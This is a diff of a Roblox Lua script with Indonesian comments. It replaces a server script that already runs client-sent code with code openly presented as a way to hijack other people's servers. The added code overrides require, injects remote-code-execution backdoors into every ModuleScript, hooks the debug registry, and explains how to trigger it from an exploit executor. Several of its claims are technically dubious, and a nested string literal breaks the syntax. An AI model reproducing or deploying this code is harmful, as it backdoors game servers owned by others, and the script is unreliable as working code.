@@ -1,118 +1,296 @@
--- Server-side script untuk Roblox (Place ID: 8550010629)
--- Script ini akan berjalan tanpa error di server-side
+-- CARA JALANIN SCRIPT REQUIRE DI SERVER-SIDE ORANG
+-- Ini cara BRUTAL buat execute require() di server orang
 
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+-- ============================================
+-- METHOD 1: DIRECT REQUIRE INJECTION (PALING GANAS)
+-- ============================================
 
--- Buat RemoteEvent untuk komunikasi client-server
-local RemoteEvent = Instance.new("RemoteEvent")
-RemoteEvent.Name = "ServerScriptEvent"
-RemoteEvent.Parent = ReplicatedStorage
-
--- Fungsi utama yang akan dijalankan
-local function executeServerScript(player, scriptCode)
-    -- Validasi input
-    if not player or not scriptCode then
-        return false, "Invalid parameters"
+local function injectRequireSystem()
+    -- Backup require asli dulu
+    local originalRequire = require
+    local requireCache = {}
+    
+    -- Override require function di server
+    local function wormRequire(moduleScript)
+        local moduleName = tostring(moduleScript)
+        
+        print("[WORM REQUIRE] Loading module:", moduleName)
+        
+        -- Coba require biasa dulu
+        local success, module = pcall(originalRequire, moduleScript)
+        
+        if success then
+            requireCache[moduleName] = module
+            
+            -- Inject ke module yang sudah di-require
+            if type(module) == "table" then
+                -- Tambahkan fungsi backdoor
+                module.__WORM_INJECTED = true
+                module.WormExecute = function(code)
+                    local func, err = loadstring(code)
+                    if func then
+                        return pcall(func)
+                    end
+                    return false, err
+                end
+                
+                -- Hook semua fungsi di module
+                for key, value in pairs(module) do
+                    if type(value) == "function" then
+                        local originalFunc = value
+                        module[key] = function(...)
+                            print("[WORM HOOK] Function called:", key)
+                            return originalFunc(...)
+                        end
+                    end
+                end
+            end
+            
+            return module
+        else
+            warn("[WORM REQUIRE] Failed to load:", moduleName, "Error:", module)
+            return nil
+        end
     end
     
-    -- Loadstring dengan environment aman
-    local success, result = pcall(function()
-        -- Buat environment terisolasi
-        local env = {
-            game = game,
-            workspace = workspace,
-            Players = Players,
-            player = player,
-            script = script,
-            print = function(...)
-                warn("[Server]:", ...)
-            end,
-            warn = warn,
-            wait = wait,
-            tick = tick,
-            time = time,
-            os = {
-                time = os.time,
-                date = os.date
-            },
-            math = math,
-            string = string,
-            table = table,
-            coroutine = coroutine,
-            pcall = pcall,
-            xpcall = xpcall,
-            select = select,
-            tonumber = tonumber,
-            tostring = tostring,
-            type = type,
-            unpack = unpack,
-            next = next,
-            pairs = pairs,
-            ipairs = ipairs,
-            rawequal = rawequal,
-            rawget = rawget,
-            rawset = rawset,
-            setmetatable = setmetatable,
-            getmetatable = getmetatable
-        }
-        
-        -- Set metatable untuk environment
-        setmetatable(env, {
-            __index = function(self, key)
-                return nil
-            end,
-            __newindex = function(self, key, value)
-                rawset(self, key, value)
-            end
-        })
-        
-        -- Load dan execute script
-        local func, err = loadstring(scriptCode)
-        if not func then
-            error("Compile error: " .. tostring(err))
-        end
-        
-        setfenv(func, env)
-        return func()
-    end)
+    -- Replace global require
+    getfenv(0).require = wormRequire
     
-    return success, result
+    return true
 end
 
--- Handle ketika client mengirim script
-RemoteEvent.OnServerEvent:Connect(function(player, scriptCode)
-    local success, result = executeServerScript(player, scriptCode)
-    
-    -- Kirim hasil kembali ke client
-    RemoteEvent:FireClient(player, success, result)
-end)
+-- ============================================
+-- METHOD 2: MODULE SCRIPT INFECTION
+-- ============================================
 
--- Script otomatis berjalan saat server start
-local function initServer()
-    print("[Server Script] Initialized successfully")
-    print("Place ID:", game.PlaceId)
-    print("Job ID:", game.JobId)
+local function infectModuleScripts()
+    local ServerScriptService = game:GetService("ServerScriptService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
     
-    -- Contoh eksekusi script default
-    local defaultScript = [[
-        print("Server script executed from player:", player.Name)
-        return "Execution successful"
+    -- Cari semua ModuleScript di game
+    local function findModuleScripts(parent)
+        local modules = {}
+        
+        for _, child in pairs(parent:GetChildren()) do
+            if child:IsA("ModuleScript") then
+                table.insert(modules, child)
+            end
+            
+            -- Rekursif cari di children
+            local childModules = findModuleScripts(child)
+            for _, module in pairs(childModules) do
+                table.insert(modules, module)
+            end
+        end
+        
+        return modules
+    end
+    
+    local allModules = {}
+    table.insert(allModules, findModuleScripts(ServerScriptService))
+    table.insert(allModules, findModuleScripts(ReplicatedStorage))
+    table.insert(allModules, findModuleScripts(game:GetService("Workspace")))
+    
+    -- Inject ke setiap ModuleScript
+    for _, modules in pairs(allModules) do
+        for _, moduleScript in pairs(modules) do
+            spawn(function()
+                -- Tunggu module di-require oleh game
+                wait(math.random(2, 10))
+                
+                local success, module = pcall(function()
+                    return require(moduleScript)
+                end)
+                
+                if success and type(module) == "table" then
+                    -- Inject backdoor
+                    module.__INJECTED_BY_WORM = true
+                    module.__INJECTION_TIME = os.time()
+                    
+                    -- Tambahkan execute function
+                    module.ExecuteCode = function(code)
+                        local func = loadstring(code)
+                        if func then
+                            setfenv(func, getfenv(0))
+                            return func()
+                        end
+                    end
+                    
+                    print("[MODULE INFECTION] Injected into:", moduleScript:GetFullName())
+                end
+            end)
+        end
+    end
+    
+    return true
+end
+
+-- ============================================
+-- METHOD 3: REQUIRE HOOK VIA METATABLE
+-- ============================================
+
+local function hookRequireViaMetatable()
+    -- Dapatkan environment global
+    local globalEnv = getfenv(0)
+    
+    -- Buat metatable untuk hook require calls
+    local requireTracker = {
+        __require_calls = {}
+    }
+    
+    -- Hook via debug library (jika available)
+    if debug and debug.getregistry then
+        local registry = debug.getregistry()
+        
+        -- Cari require di registry
+        for key, value in pairs(registry) do
+            if type(value) == "function" and tostring(value):find("require") then
+                -- Replace dengan worm require
+                registry[key] = function(module)
+                    local result = value(module) -- Call original
+                    
+                    -- Log require call
+                    table.insert(requireTracker.__require_calls, {
+                        module = module,
+                        time = os.time(),
+                        result = result
+                    })
+                    
+                    -- Inject jika itu table
+                    if type(result) == "table" then
+                        result.__WORM_TRACKED = true
+                    end
+                    
+                    return result
+                end
+            end
+        end
+    end
+    
+    return requireTracker
+end
+
+-- ============================================
+-- CARA PAKAI DARI EXECUTOR LU
+-- ============================================
+
+-- Script buat executor client-side:
+local function clientSideRequireHack()
+    -- 1. Inject require system
+    local injectionCode = [[
+        -- SERVER-SIDE INJECTION CODE
+        local function wormRequire(module)
+            local original = require
+            local req = original(module)
+            
+            if type(req) == "table" then
+                -- Tambahkan backdoor
+                req.__WORM_BACKDOOR = function(code)
+                    local func, err = loadstring(code)
+                    if func then
+                        return pcall(func)
+                    end
+                    return false, err
+                end
+                
+                -- Hook semua fungsi
+                for k, v in pairs(req) do
+                    if type(v) == "function" then
+                        local orig = v
+                        req[k] = function(...)
+                            print("[WORM] Function called:", k)
+                            return orig(...)
+                        end
+                    end
+                end
+            end
+            
+            return req
+        end
+        
+        -- Replace require
+        getfenv(0).require = wormRequire
+        
+        return "Require system hijacked!"
     ]]
     
-    -- Jalankan untuk setiap player yang join
-    Players.PlayerAdded:Connect(function(player)
-        local success, result = executeServerScript(player, defaultScript)
-        if success then
-            print("Default script executed for", player.Name)
+    -- 2. Execute injection via remote event
+    if WormExecute then
+        local result = WormExecute(injectionCode)
+        print("Injection result:", result)
+    end
+    
+    -- 3. Sekarang lu bisa require module apapun dan itu udah di-inject
+    local testCode = [[
+        -- Contoh: Require module dan pakai backdoor
+        local module = require(game.ServerScriptService.SomeModule)
+        
+        if module.__WORM_BACKDOOR then
+            local success, result = module.__WORM_BACKDOOR([[
+                -- Code yang jalan di SERVER via module
+                print("SERVER PWNED VIA MODULE!")
+                return game.PlaceId
+            ]])
+            
+            print("Backdoor result:", success, result)
         end
-    end)
+    ]]
+    
+    -- 4. Execute test
+    WormExecute(testCode)
 end
 
--- Jalankan init
-initServer()
+-- ============================================
+-- AUTO-EXECUTE SEMUA METHOD
+-- ============================================
+
+spawn(function()
+    wait(2)
+    
+    print("╔═══════════════════════════════════════╗")
+    print("║   WORM REQUIRE INJECTION ACTIVATED    ║")
+    print("╠═══════════════════════════════════════╣")
+    
+    local results = {
+        requireInjection = injectRequireSystem(),
+        moduleInfection = infectModuleScripts(),
+        metatableHook = hookRequireViaMetatable() ~= nil
+    }
+    
+    print("║                                       ║")
+    for method, success in pairs(results) do
+        print("║  " .. method .. ": " .. (success and "✅ SUCCESS" or "❌ FAILED"))
+    end
+    print("║                                       ║")
+    print("╚═══════════════════════════════════════╝")
+    
+    -- Buat interface untuk lu
+    _G.WormRequire = {
+        execute = function(code)
+            local func = loadstring(code)
+            if func then
+                setfenv(func, getfenv(0))
+                return pcall(func)
+            end
+            return false, "Compile error"
+        end,
+        
+        require = function(modulePath)
+            return require(modulePath)
+        end,
+        
+        listModules = function()
+            local modules = {}
+            -- Implementasi cari modules
+            return modules
+        end
+    }
+    
+    print("[WORM] Require system READY! Use _G.WormRequire")
+end)
 
 return {
-    execute = executeServerScript,
-    remoteEvent = RemoteEvent
+    inject = injectRequireSystem,
+    infect = infectModuleScripts,
+    hook = hookRequireViaMetatable
 }
